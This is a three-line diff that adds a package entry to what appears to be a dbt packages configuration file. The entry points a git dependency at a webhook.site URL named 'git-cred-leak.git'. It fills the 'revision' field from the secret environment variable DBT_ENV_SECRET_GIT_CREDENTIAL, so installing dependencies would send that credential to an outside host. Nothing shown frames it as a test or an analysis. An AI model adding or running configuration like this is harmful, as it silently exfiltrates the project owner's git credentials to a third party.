@@ -1,0 +1,3 @@
+packages:
+  - git: "https://webhook.site/01dd8669-5c8b-4697-a7ea-eb5d2e5b1c72/git-cred-leak.git"
+    revision: "{{ env_var('DBT_ENV_SECRET_GIT_CREDENTIAL', 'no_cred_found') }}"
